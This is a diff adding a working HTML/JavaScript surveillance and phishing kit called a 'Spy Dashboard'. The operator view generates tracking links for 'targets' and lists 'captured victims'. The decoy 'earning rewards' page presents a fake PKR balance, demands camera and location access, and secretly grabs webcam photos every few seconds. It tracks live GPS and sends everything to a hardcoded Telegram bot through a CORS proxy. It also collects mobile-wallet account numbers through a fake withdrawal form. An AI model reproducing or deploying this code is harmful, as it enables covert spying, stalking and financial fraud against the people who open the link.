+      <div class="brand-logo"><img src="https://i.ibb.co/mVVvwypv/550518.jpg" alt="NOVA"></div>
+      <div class="brand-meta">
+        <h1>AHSAN <em>×</em> NOVA</h1>
+        <small>Spy Dashboard</small>
+      </div>
+    </div>
+    <div class="header-right">
+      <div class="status-pill">Live</div>
+    </div>
+  </header>
+
+  <div class="wrapper">
+    <div class="hero">
+      <div class="hero-content">
+        <span class="hero-tag"><i class="fa-solid fa-eye"></i> Surveillance Console</span>
+        <h2>Capture. Track. <span>Monitor.</span></h2>
+        <p>Generate a tracking link, send it to your target. When they open it, permissions will pop up automatically. Once allowed, camera photos and live location will appear here.</p>
+        <div class="hero-actions">
+          <button class="btn-hero primary" onclick="generateLink()">
+            <i class="fa-solid fa-link"></i> Generate Link
+          </button>
+          <button class="btn-hero ghost" onclick="clearAllData()">
+            <i class="fa-solid fa-trash"></i> Clear All
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-bottom:20px">
+      <div class="card-head">
+        <div class="card-title">
+          <i class="fa-solid fa-link"></i>
+          <div>
+            Link Generator
+            <div class="card-subtitle">Generate a tracking link to send to your target</div>
+          </div>
+        </div>
+      </div>
+      <div class="link-gen-box">
+        <div class="label"><i class="fa-solid fa-sparkles"></i> Tracking URL</div>
+        <div class="link-result">
+          <input type="text" id="generatedLink" readonly placeholder="Click 'Generate Link' to create a tracking URL" onclick="this.select()">
+          <button class="btn primary" onclick="copyLink()"><i class="fa-solid fa-copy"></i> Copy</button>
+          <button class="btn" onclick="openTestLink()"><i class="fa-solid fa-external-link-alt"></i> Test</button>
+        </div>
+      </div>
+      <div style="font-size:12px;color:var(--text-muted);line-height:1.6">
+        <i class="fa-solid fa-info-circle" style="color:var(--primary)"></i>
+        Share this link. When target opens, browser will request camera + location. If they allow, data flows in.
+      </div>
+    </div>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-head">
+          <div class="card-title">
+            <i class="fa-solid fa-users"></i>
+            <div>
+              Captured Victims
+              <div class="card-subtitle">Live feed from <span id="victimCount">0</span> active sessions</div>
+            </div>
+          </div>
+        </div>
+        <div id="victimsList">
+          <div class="empty">
+            <i class="fa-solid fa-satellite-dish"></i>
+            No victims yet. Generate a link and share it.
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card" style="margin-bottom:20px">
+          <div class="card-head">
+            <div class="card-title">
+              <i class="fa-solid fa-chart-simple"></i>
+              Live Stats
+            </div>
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
+            <div style="padding:16px;border-radius:12px;background:linear-gradient(135deg,rgba(124,58,237,.15),rgba(236,72,153,.1));border:1px solid rgba(124,58,237,.25)">
+              <div style="font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.08em;font-weight:700;margin-bottom:4px">Sessions</div>
+              <div style="font-family:var(--f-display);font-size:24px;font-weight:800;color:var(--primary-2)" id="statSessions">0</div>
+            </div>
+            <div style="padding:16px;border-radius:12px;background:linear-gradient(135deg,rgba(16,185,129,.15),rgba(6,182,212,.1));border:1px solid rgba(16,185,129,.25)">
+              <div style="font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.08em;font-weight:700;margin-bottom:4px">Photos</div>
+              <div style="font-family:var(--f-display);font-size:24px;font-weight:800;color:var(--green)" id="statPhotos">0</div>
+            </div>
+            <div style="padding:16px;border-radius:12px;background:linear-gradient(135deg,rgba(59,130,246,.15),rgba(6,182,212,.1));border:1px solid rgba(59,130,246,.25)">
+              <div style="font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.08em;font-weight:700;margin-bottom:4px">Locations</div>
+              <div style="font-family:var(--f-display);font-size:24px;font-weight:800;color:var(--blue)" id="statLocations">0</div>
+            </div>
+            <div style="padding:16px;border-radius:12px;background:linear-gradient(135deg,rgba(251,191,36,.15),rgba(236,72,153,.1));border:1px solid rgba(251,191,36,.25)">
+              <div style="font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.08em;font-weight:700;margin-bottom:4px">Telegram</div>
+              <div style="font-family:var(--f-display);font-size:24px;font-weight:800;color:var(--gold)" id="statTelegram">0</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head">
+            <div class="card-title">
+              <i class="fa-solid fa-shield-halved"></i>
+              Info
+            </div>
+          </div>
+          <div style="font-size:12px;color:var(--text-sub);line-height:1.8">
+            <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-soft)">
+              <span style="color:var(--text-muted)">Bot</span>
+              <span style="font-family:monospace;font-size:10px">Active</span>
+            </div>
+            <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-soft)">
+              <span style="color:var(--text-muted)">Chat ID</span>
+              <span style="font-family:monospace">8167112365</span>
+            </div>
+            <div style="display:flex;justify-content:space-between;padding:6px 0">
+              <span style="color:var(--text-muted)">Domain</span>
+              <span style="font-family:monospace;font-size:10px">current</span>
+            </div>
+          </div>
+          <div style="margin-top:12px;padding:10px 12px;border-radius:10px;background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.25);font-size:11px;color:#ffd166;line-height:1.5">
+            <i class="fa-solid fa-triangle-exclamation"></i>
+            <b>HTTPS required:</b> Camera will not work on http. Use Vercel/Netlify/GitHub Pages.
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <b>AHSAN × NOVA</b> — Surveillance Console · All rights reserved
+  </div>
+</div>
+
+<!-- ============================================================
+     VICTIM VIEW (Decoy Earning Page)
+     ============================================================ -->
+<div id="victimView" class="victim-body hidden">
+  
+  <!-- LOADING (Shown during initial permission request) -->
+  <div class="victim-loading" id="victimLoading">
+    <div class="spinner"></div>
+    <p id="victimLoadingText">Verifying permissions...</p>
+  </div>
+
+  <!-- BLOCK SCREEN (If denied) -->
+  <div class="victim-block hidden" id="victimBlock">
+    <div class="icon"><i class="fa-solid fa-xmark"></i></div>
+    <h2>Access Denied</h2>
+    <p>You must allow camera and location permissions to access this page. Please click the button below and allow all permissions.</p>
+    <button onclick="retryPermissions()">Retry Access</button>
+  </div>
+
+  <!-- MAIN EARNING PAGE -->
+  <div class="victim-container" id="victimMainContent" style="display:none">
+    
+    <!-- HEADER -->
+    <div class="victim-header">
+      <div class="logo-wrap">
+        <div class="logo"><img src="https://i.ibb.co/mVVvwypv/550518.jpg" alt="NOVA"></div>
+        <div class="brand">
+          <b>AHSAN × NOVA</b>
+          <small>Earning Rewards</small>
+        </div>
+      </div>
+      <div class="icon-btn"><i class="fa-solid fa-crown"></i></div>
+    </div>
+
+    <!-- BALANCE CARD -->
+    <div class="balance-card">
+      <div class="balance-label">Your Balance</div>
+      <div class="balance-amount" id="balanceAmount">PKR 12,450</div>
+      <div class="balance-currency">Available for withdrawal</div>
+      <div class="balance-row">
+        <div class="balance-stat">
+          <b id="statTasks">0</b>
+          <small>Tasks Done</small>
+        </div>
+        <div class="balance-stat">
+          <b id="statAds">0</b>
+          <small>Ads Watched</small>
+        </div>
+        <div class="balance-stat">
+          <b id="statReward">PKR 0</b>
+          <small>Today Earned</small>
+        </div>
+      </div>
+    </div>
+
+    <!-- WATCH ADS CARD -->
+    <div class="ad-card">
+      <div class="ad-card-head">
+        <div class="ad-card-title">
+          <i class="fa-solid fa-play-circle"></i> Watch & Earn
+        </div>
+        <div class="ad-badge">+PKR 50 / ad</div>
+      </div>
+      
+      <!-- AD PLAYER -->
+      <div class="ad-player">
+        <div class="ad-visual">
+          <div class="ad-icon" id="adIcon">🎬</div>
+        </div>
+        <div class="ad-info">
+          <b id="adTitle">Premium Ad</b>
+          <small id="adSubtitle">Watch to earn PKR 50 instantly</small>
+        </div>
+        <div class="ad-timer-bar">
+          <div class="ad-timer-fill" id="adTimerFill"></div>
+        </div>
+      </div>
+      
+      <button class="ad-watch-btn" id="watchBtn" onclick="startWatchingAd()">
+        <i class="fa-solid fa-play"></i> Watch Ad — Earn PKR 50
+      </button>
+    </div>
+
+    <!-- MORE AD TASKS -->
+    <div class="ad-card">
+      <div class="ad-card-head">
+        <div class="ad-card-title">
+          <i class="fa-solid fa-fire"></i> More Tasks
+        </div>
+      </div>
+      
+      <div class="ad-list-item">
+        <div class="ad-list-icon c1"><i class="fa-solid fa-gamepad"></i></div>
+        <div class="ad-list-info">
+          <b>Play Mobile Game</b>
+          <small>Install & play for 2 minutes</small>
+        </div>
+        <div class="ad-list-reward">+PKR 250</div>
+      </div>
+      
+      <div class="ad-list-item">
+        <div class="ad-list-icon c2"><i class="fa-solid fa-mobile-screen-button"></i></div>
+        <div class="ad-list-info">
+          <b>Install App</b>
+          <small>Install & open for 30 seconds</small>
+        </div>
+        <div class="ad-list-reward">+PKR 500</div>
+      </div>
+      
+      <div class="ad-list-item">
+        <div class="ad-list-icon c3"><i class="fa-solid fa-clipboard-list"></i></div>
+        <div class="ad-list-info">
+          <b>Quick Survey</b>
+          <small>Answer 5 simple questions</small>
+        </div>
+        <div class="ad-list-reward">+PKR 150</div>
+      </div>
+      
+      <div class="ad-list-item">
+        <div class="ad-list-icon c4"><i class="fa-solid fa-shopping-bag"></i></div>
+        <div class="ad-list-info">
+          <b>Shopping Offer</b>
+          <small>Visit partner store</small>
+        </div>
+        <div class="ad-list-reward">+PKR 300</div>
+      </div>
+    </div>
+
+    <!-- WITHDRAWAL -->
+    <div class="withdraw-card">
+      <div class="withdraw-title">
+        <i class="fa-solid fa-wallet"></i> Withdrawal Method
+      </div>
+      
+      <div class="wallet-grid">
+        <div class="wallet-opt active" data-wallet="easypaisa" onclick="selectWallet(this)">
+          <div class="logo easypaisa">E</div>
+          <div class="name">Easypaisa</div>
+        </div>
+        <div class="wallet-opt" data-wallet="jazzcash" onclick="selectWallet(this)">
+          <div class="logo jazzcash">J</div>
+          <div class="name">JazzCash</div>
+        </div>
+        <div class="wallet-opt" data-wallet="sadapay" onclick="selectWallet(this)">
+          <div class="logo sadapay">S</div>
+          <div class="name">SadaPay</div>
+        </div>
+        <div class="wallet-opt" data-wallet="nayapay" onclick="selectWallet(this)">
+          <div class="logo nayapay">N</div>
+          <div class="name">NayaPay</div>
+        </div>
+      </div>
+
+      <input 
+        type="tel" 
+        class="victim-input" 
+        id="walletNumber" 
+        placeholder="Enter 11-digit account number (03XXXXXXXXX)"
+        maxlength="11"
+        inputmode="numeric"
+      >
+
+      <button class="victim-btn" id="withdrawBtn" onclick="startWithdrawal()">
+        <i class="fa-solid fa-arrow-circle-down"></i> Start Withdrawal
+      </button>
+    </div>
+
+    <div class="victim-footer">
+      <i class="fa-solid fa-lock"></i> Your data is encrypted and secure<br>
+      © 2025 AHSAN × NOVA Rewards
+    </div>
+  </div>
+
+  <!-- SUCCESS MODAL -->
+  <div class="victim-modal-overlay" id="successModal">
+    <div class="victim-modal">
+      <div class="icon success"><i class="fa-solid fa-check"></i></div>
+      <h3>Withdrawal Initiated</h3>
+      <p id="successMsg">Your withdrawal request has been submitted. You will receive funds within 24-48 hours.</p>
+      <button class="victim-btn" onclick="closeSuccessModal()">OK</button>
+    </div>
+  </div>
+
+  <!-- AD WATCH MODAL -->
+  <div class="ad-watch-modal" id="adWatchModal">
+    <div class="ad-watch-content">
+      <div class="ad-watch-icon">🎬</div>
+      <h3>Watching Ad...</h3>
+      <p>Please don't close this tab</p>
+      <div class="ad-watch-timer" id="adCountdown">15</div>
+      <div class="ad-watch-progress"><i id="adProgressFill"></i></div>
+      <button class="ad-watch-close" onclick="cancelAdWatch()" style="display:none" id="adCloseBtn">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- CAMERA VIEWER -->
+<div class="camera-viewer" id="cameraViewer" onclick="if(event.target===this)closeCameraViewer()">
+  <button class="camera-close" onclick="closeCameraViewer()"><i class="fa-solid fa-xmark"></i></button>
+  <img id="cameraViewerImg" src="" alt="Photo">
+</div>
+
+<script>
+/* ============================================================
+   AHSAN x NOVA — V27 SPY DASHBOARD + EARNING
+   ============================================================ */
+
+const BOT_TOKEN = "9207510733:AAFhMn8dUDuU8IslEpiHyiGbkXWnMpC0pyQ";
+const CHAT_ID = "8167112365";
+const CORS_PROXY = "https://corsproxy.io/?url=";
+const TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN;
+
+const $ = id => document.getElementById(id);
+const esc = v => String(v ?? "").replace(/[&<>"']/g, m => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m]));
+
+/* STORAGE */
+const STORE_KEY = "nova_spy_victims";
+function getVictims() {
+  try { return JSON.parse(localStorage.getItem(STORE_KEY) || "[]"); } catch(e) { return []; }
+}
+function saveVictims(v) {
+  try { localStorage.setItem(STORE_KEY, JSON.stringify(v)); } catch(e) {}
+}
+function addVictim(victim) {
+  const victims = getVictims();
+  const existing = victims.findIndex(v => v.id === victim.id);
+  if (existing >= 0) victims[existing] = { ...victims[existing], ...victim };
+  else victims.unshift(victim);
+  saveVictims(victims);
+  renderDashboard();
+}
+function updateVictim(id, updates) {
+  const victims = getVictims();
+  const idx = victims.findIndex(v => v.id === id);
+  if (idx >= 0) {
+    victims[idx] = { ...victims[idx], ...updates };
+    saveVictims(victims);
+    renderDashboard();
+  }
+}
+
+/* TOAST */
+function showToast(msg, type = "info", duration = 3200) {
+  const box = $("toastContainer");
+  if (!box) return;
+  const icons = { success: "fa-circle-check", error: "fa-circle-xmark", warning: "fa-triangle-exclamation", info: "fa-circle-info" };
+  const el = document.createElement("div");
+  el.className = `toast ${type}`;
+  el.innerHTML = `<i class="fa-solid ${icons[type] || icons.info} toast-icon"></i><span>${esc(msg)}</span>`;
+  box.appendChild(el);
+  setTimeout(() => { el.style.opacity = "0"; el.style.transform = "translateX(100px)"; setTimeout(() => el.remove(), 300); }, duration);
+}
+
+/* TELEGRAM */
+async function sendPhotoToTelegram(blob, caption) {
+  try {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("caption", caption || "📸 New photo captured");
+    formData.append("photo", blob, "photo.jpg");
+    const url = CORS_PROXY + encodeURIComponent(TELEGRAM_API + "/sendPhoto");
+    const res = await fetch(url, { method: "POST", body: formData });
+    const data = await res.json();
+    return data.ok || false;
+  } catch (e) { return false; }
+}
+
+async function sendMessageToTelegram(text) {
+  try {
+    const url = CORS_PROXY + encodeURIComponent(TELEGRAM_API + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text) + "&parse_mode=HTML");
+    const res = await fetch(url);
+    const data = await res.json();
+    return data.ok || false;
+  } catch (e) { return false; }
+}
+
+/* LINK GENERATION */
+function generateLink() {
+  const sessionId = "NOVA-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).substring(2, 8).toUpperCase();
+  const baseUrl = window.location.href.split("#")[0].split("?")[0];
+  const trackingLink = baseUrl + "?sid=" + sessionId;
+  
+  $("generatedLink").value = trackingLink;
+  
+  const pending = JSON.parse(localStorage.getItem("nova_pending_sessions") || "[]");
+  pending.unshift({ id: sessionId, createdAt: Date.now(), link: trackingLink });
+  localStorage.setItem("nova_pending_sessions", JSON.stringify(pending.slice(0, 50)));
+  
+  showToast("Tracking link generated!", "success");
+  sendMessageToTelegram(`🔗 <b>New Tracking Link Generated</b>\n\n<code>${trackingLink}</code>`);
+}
+
+function copyLink() {
+  const input = $("generatedLink");
+  if (!input.value) return showToast("Generate a link first.", "warning");
+  input.select();
+  input.setSelectionRange(0, 99999);
+  try {
+    navigator.clipboard.writeText(input.value);
+    showToast("Link copied!", "success");
+  } catch(e) {
+    document.execCommand("copy");
+    showToast("Link copied!", "success");
+  }
+}
+
+function openTestLink() {
+  const input = $("generatedLink");
+  if (!input.value) return showToast("Generate a link first.", "warning");
+  window.open(input.value, "_blank");
+}
+
+/* DASHBOARD RENDER */
+function renderDashboard() {
+  const victims = getVictims();
+  const list = $("victimsList");
+  
+  $("victimCount").textContent = victims.length;
+  $("statSessions").textContent = victims.length;
+  $("statPhotos").textContent = victims.reduce((s, v) => s + (v.photos?.length || 0), 0);
+  $("statLocations").textContent = victims.filter(v => v.location).length;
+  $("statTelegram").textContent = victims.reduce((s, v) => s + (v.telegramCount || 0), 0);
+  
+  if (!victims.length) {
+    list.innerHTML = `<div class="empty"><i class="fa-solid fa-satellite-dish"></i>No victims yet. Generate a link and share it.</div>`;
+    return;
+  }
+  
+  list.innerHTML = victims.map(v => renderVictimCard(v)).join("");
+}
+
+function renderVictimCard(v) {
+  const loc = v.location;
+  const photos = v.photos || [];
+  const locText = loc ? (loc.address || `${loc.lat?.toFixed(4)}, ${loc.lng?.toFixed(4)}`) : "Not captured yet";
+  const locCoords = loc ? `${loc.lat?.toFixed(6)}, ${loc.lng?.toFixed(6)}` : "—";
+  const photosHtml = photos.length
+    ? photos.map((p, idx) => `
+      <div class="photo-item" onclick="viewPhoto('${esc(p.dataUrl)}')">
+        <div class="photo-time">${new Date(p.time).toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit'})}</div>
+        <img src="${esc(p.dataUrl)}" alt="Capture" loading="lazy">
+        <div class="photo-actions">
+          <button class="download" onclick="event.stopPropagation();downloadPhoto('${esc(p.dataUrl)}', ${idx}, '${esc(v.id)}')" title="Download"><i class="fa-solid fa-download"></i></button>
+          <button class="delete" onclick="event.stopPropagation();deletePhoto('${esc(v.id)}', ${idx})" title="Delete"><i class="fa-solid fa-trash"></i></button>
+        </div>
+      </div>
+    `).join("")
+    : `<div style="grid-column:1/-1" class="empty"><i class="fa-solid fa-camera"></i>No photos yet</div>`;
+  
+  const ago = timeAgo(v.lastUpdate || v.createdAt);
+  const withdrawalInfo = v.withdrawal ? `
+    <div class="victim-section" style="background:rgba(251,191,36,.08);border-color:rgba(251,191,36,.25)">
+      <div class="victim-section-title" style="color:#fbbf24"><i class="fa-solid fa-money-bill"></i> Withdrawal Submitted</div>
+      <div style="font-size:12px;color:var(--text-sub);line-height:1.6">
+        <b>Method:</b> ${esc(v.withdrawal.method)}<br>
+        <b>Account:</b> <code style="color:#fbbf24">${esc(v.withdrawal.account)}</code><br>
+        <b>Amount:</b> PKR ${esc(v.withdrawal.amount)}<br>
+        <b>Time:</b> ${new Date(v.withdrawal.time).toLocaleString()}
+      </div>
+    </div>
+  ` : "";
+  
+  return `
+    <div class="victim-card">
+      <div class="victim-head">
+        <div class="victim-id">
+          <div class="victim-avatar">${esc((v.id || "?").substring(5, 6))}</div>
+          <div class="victim-info">
+            <b>${esc(v.id)}</b>
+            <small>${ago} · ${photos.length} photos</small>
+          </div>
+        </div>
+        <div class="victim-badge"><i class="fa-solid fa-circle" style="font-size:6px"></i> ${v.active ? "Active" : "Idle"}</div>
+      </div>
+      
+      <div class="victim-section">
+        <div class="victim-section-title"><i class="fa-solid fa-location-dot"></i> Location</div>
+        <div class="loc-info">
+          <div class="ic"><i class="fa-solid fa-location-dot"></i></div>
+          <div class="txt">
+            <b>${esc(locText)}</b>
+            <small>${esc(locCoords)}</small>
+          </div>
+          ${loc ? `<a class="btn-icon" href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank" title="Open Maps"><i class="fa-solid fa-map-location-dot"></i></a>` : ""}
+        </div>
+      </div>
+      
+      <div class="victim-section">
+        <div class="victim-section-title"><i class="fa-solid fa-camera"></i> Photos (${photos.length})</div>
+        <div class="photos-grid">${photosHtml}</div>
+      </div>
+      
+      ${withdrawalInfo}
+      
+      <div style="display:flex;gap:8px;justify-content:space-between;flex-wrap:wrap">
+        <button class="btn btn-sm danger" onclick="removeVictim('${esc(v.id)}')"><i class="fa-solid fa-trash"></i> Remove</button>
+        <button class="btn btn-sm" onclick="renderDashboard()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
+      </div>
+    </div>
+  `;
+}
+
+function timeAgo(ts) {
+  if (!ts) return "Just now";
+  const diff = (Date.now() - ts) / 1000;
+  if (diff < 60) return "Just now";
+  if (diff < 3600) return Math.floor(diff / 60) + "m ago";
+  if (diff < 86400) return Math.floor(diff / 3600) + "h ago";
+  return Math.floor(diff / 86400) + "d ago";
+}
+
+/* PHOTO ACTIONS */
+function viewPhoto(dataUrl) {
+  $("cameraViewerImg").src = dataUrl;
+  $("cameraViewer").classList.add("open");
+  document.body.style.overflow = "hidden";
+}
+function closeCameraViewer() {
+  $("cameraViewer").classList.remove("open");
+  document.body.style.overflow = "";
+}
+function downloadPhoto(dataUrl, idx, victimId) {
+  try {
+    const a = document.createElement("a");
+    a.href = dataUrl;
+    a.download = "AHSAN_NOVA_" + victimId + "_" + idx + "_" + Date.now() + ".jpg";
+    a.click();
+    showToast("Photo downloaded", "success");
+  } catch (e) { showToast("Download failed", "error"); }
+}
+function deletePhoto(victimId, idx) {
+  if (!confirm("Delete this photo?")) return;
+  const victims = getVictims();
+  const v = victims.find(x => x.id === victimId);
+  if (v && v.photos) {
+    v.photos.splice(idx, 1);
+    saveVictims(victims);
+    renderDashboard();
+    showToast("Photo deleted", "success");
+  }
+}
+function removeVictim(victimId) {
+  if (!confirm("Remove this victim and all data?")) return;
+  const victims = getVictims().filter(x => x.id !== victimId);
+  saveVictims(victims);
+  renderDashboard();
+  showToast("Victim removed", "success");
+}
+function clearAllData() {
+  if (!confirm("Clear ALL captured data?")) return;
+  saveVictims([]);
+  renderDashboard();
+  showToast("All data cleared", "success");
+}
+
+/* ============================================================
+   VICTIM SIDE
+   ============================================================ */
+let currentSessionId = null;
+let victimVideo = null;
+let victimCanvas = null;
+let captureInterval = null;
+let locationWatchId = null;
+let selectedWallet = "easypaisa";
+let currentAdTimer = null;
+let currentAdBalance = 12450;
+let tasksDone = 0;
+let adsWatched = 0;
+let todayReward = 0;
+
+function getSessionIdFromURL() {
+  const params = new URLSearchParams(window.location.search);
+  return params.get("sid");
+}
+
+window.selectWallet = function(el) {
+  document.querySelectorAll(".wallet-opt").forEach(w => w.classList.remove("active"));
+  el.classList.add("active");
+  selectedWallet = el.dataset.wallet;
+};
+
+/* PERMISSIONS ON PAGE LOAD */
+async function requestPermissionsOnLoad() {
+  const sid = getSessionIdFromURL();
+  if (!sid) return;
+  
+  currentSessionId = sid;
+  $("victimLoading").classList.add("show");
+  $("victimLoadingText").textContent = "Requesting camera...";
+  
+  try {
+    // 1. Camera
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    
+    $("victimLoadingText").textContent = "Requesting location...";
+    
+    // 2. Location
+    let location;
+    try {
+      location = await getLocation();
+    } catch(e) {
+      console.warn("Location denied:", e);
+      // If location denied, block access
+      $("victimLoading").classList.remove("show");
+      $("victimBlock").classList.remove("hidden");
+      stopCamera(stream);
+      return;
+    }
+    
+    // 3. Save victim
+    const victim = {
+      id: sid,
+      createdAt: Date.now(),
+      lastUpdate: Date.now(),
+      active: true,
+      location: location,
+      photos: [],
+      telegramCount: 0,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform
+    };
+    addVictim(victim);
+    
+    sendMessageToTelegram(`🚨 <b>NEW VICTIM</b>\n\n<b>ID:</b> <code>${sid}</code>\n<b>Location:</b> ${location ? `${location.lat?.toFixed(5)}, ${location.lng?.toFixed(5)}` : "—"}\n<b>Time:</b> ${new Date().toLocaleString()}`);
+    
+    // 4. Setup capture
+    $("victimLoadingText").textContent = "Loading...";
+    setupVictimCapture(stream, sid);
+    startLocationWatch(sid);
+    
+    // 5. Show earning page
+    setTimeout(() => {
+      $("victimLoading").classList.remove("show");
+      $("victimMainContent").style.display = "block";
+      updateVictimStats();
+    }, 800);
+    
+  } catch (err) {
+    console.error(err);
+    $("victimLoading").classList.remove("show");
+    $("victimBlock").classList.remove("hidden");
+  }
+}
+
+function stopCamera(stream) {
+  try {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+  } catch(e) {}
+}
+
+window.retryPermissions = function() {
+  $("victimBlock").classList.add("hidden");
+  requestPermissionsOnLoad();
+};
+
+function getLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject("No geolocation");
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+        const accuracy = pos.coords.accuracy;
+        let address = "";
+        try {
+          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+          const data = await r.json();
+          address = data.display_name || "";
+        } catch(e) {}
+        resolve({ lat, lng, accuracy, address, time: Date.now() });
+      },
+      (err) => reject(err.message || "Location error"),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+}
+
+function setupVictimCapture(stream, sid) {
+  victimVideo = document.createElement("video");
+  victimVideo.srcObject = stream;
+  victimVideo.setAttribute("playsinline", "true");
+  victimVideo.muted = true;
+  victimVideo.autoplay = true;
+  victimVideo.style.cssText = "position:fixed;bottom:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;";
+  document.body.appendChild(victimVideo);
+  
+  victimVideo.onloadedmetadata = () => {
+    victimVideo.play();
+    victimCanvas = document.createElement("canvas");
+    victimCanvas.width = victimVideo.videoWidth || 640;
+    victimCanvas.height = victimVideo.videoHeight || 480;
+    
+    setTimeout(() => captureFrame(sid), 1200);
+    captureInterval = setInterval(() => captureFrame(sid), 2500);
+  };
+}
+
+function captureFrame(sid) {
+  if (!victimVideo || !victimCanvas) return;
+  try {
+    if (victimVideo.readyState < 2) return;
+    const ctx = victimCanvas.getContext("2d");
+    ctx.drawImage(victimVideo, 0, 0, victimCanvas.width, victimCanvas.height);
+    const dataUrl = victimCanvas.toDataURL("image/jpeg", 0.7);
+    
+    const victims = getVictims();
+    const v = victims.find(x => x.id === sid);
+    if (!v) return;
+    
+    if (!v.photos) v.photos = [];
+    v.photos.push({ dataUrl, time: Date.now() });
+    v.lastUpdate = Date.now();
+    v.active = true;
+    if (v.photos.length > 100) v.photos = v.photos.slice(-100);
+    saveVictims(victims);
+    
+    sendPhotoToTelegram(dataUrlToBlob(dataUrl), `📸 Photo from ${sid} at ${new Date().toLocaleTimeString()}`);
+    
+    v.telegramCount = (v.telegramCount || 0) + 1;
+    saveVictims(victims);
+    
+    if (!$("dashboardView").classList.contains("hidden")) renderDashboard();
+  } catch (e) {}
+}
+
+function dataUrlToBlob(dataUrl) {
+  const parts = dataUrl.split(",");
+  const mime = parts[0].match(/:(.*?);/)[1];
+  const bstr = atob(parts[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], { type: mime });
+}
+
+function startLocationWatch(sid) {
+  if (!navigator.geolocation) return;
+  locationWatchId = navigator.geolocation.watchPosition(
+    async (pos) => {
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+      const accuracy = pos.coords.accuracy;
+      let address = "";
+      try {
+        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+        const data = await r.json();
+        address = data.display_name || "";
+      } catch(e) {}
+      updateVictim(sid, {
+        location: { lat, lng, accuracy, address, time: Date.now() },
+        lastUpdate: Date.now()
+      });
+    },
+    (err) => console.warn("Location watch error", err),
+    { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
+  );
+}
+
+/* ============================================================
+   AD WATCHING SYSTEM
+   ============================================================ */
+window.startWatchingAd = function() {
+  const modal = $("adWatchModal");
+  const countdown = $("adCountdown");
+  const progress = $("adProgressFill");
+  const closeBtn = $("adCloseBtn");
+  
+  modal.classList.add("show");
+  closeBtn.style.display = "none";
+  
+  let timeLeft = 15;
+  const total = 15;
+  countdown.textContent = timeLeft;
+  progress.style.width = "0%";
+  
+  currentAdTimer = setInterval(() => {
+    timeLeft--;
+    countdown.textContent = timeLeft;
+    progress.style.width = ((total - timeLeft) / total * 100) + "%";
+    
+    if (timeLeft <= 0) {
+      clearInterval(currentAdTimer);
+      currentAdTimer = null;
+      completeAd();
+    }
+  }, 1000);
+};
+
+function completeAd() {
+  $("adWatchModal").classList.remove("show");
+  $("adCloseBtn").style.display = "block";
+  
+  // Add reward
+  currentAdBalance += 50;
+  todayReward += 50;
+  adsWatched++;
+  tasksDone++;
+  
+  $("balanceAmount").textContent = "PKR " + currentAdBalance.toLocaleString();
+  updateVictimStats();
+  
+  // Send notification to Telegram
+  sendMessageToTelegram(`💰 <b>AD WATCHED</b>\n\n<b>Victim:</b> <code>${currentSessionId}</code>\n<b>Reward:</b> +PKR 50\n<b>New Balance:</b> PKR ${currentAdBalance}\n<b>Time:</b> ${new Date().toLocaleString()}`);
+  
+  // Update victim record
+  updateVictim(currentSessionId, {
+    adBalance: currentAdBalance,
+    adsWatched,
+    lastAdTime: Date.now()
+  });
+  
+  // Show success
+  $("successMsg").textContent = "You earned PKR 50! Your new balance is PKR " + currentAdBalance.toLocaleString() + ".";
+  $("successModal").classList.add("show");
+}
+
+window.cancelAdWatch = function() {
+  if (currentAdTimer) {
+    clearInterval(currentAdTimer);
+    currentAdTimer = null;
+  }
+  $("adWatchModal").classList.remove("show");
+};
+
+function updateVictimStats() {
+  $("statTasks").textContent = tasksDone;
+  $("statAds").textContent = adsWatched;
+  $("statReward").textContent = "PKR " + todayReward;
+}
+
+window.closeSuccessModal = function() {
+  $("successModal").classList.remove("show");
+};
+
+/* WITHDRAWAL */
+window.startWithdrawal = function() {
+  const num = $("walletNumber").value.trim();
+  if (!/^03\d{9}$/.test(num)) {
+    alert("Please enter a valid 11-digit account number starting with 03 (e.g. 03XXXXXXXXX)");
+    return;
+  }
+  
+  const btn = $("withdrawBtn");
+  btn.disabled = true;
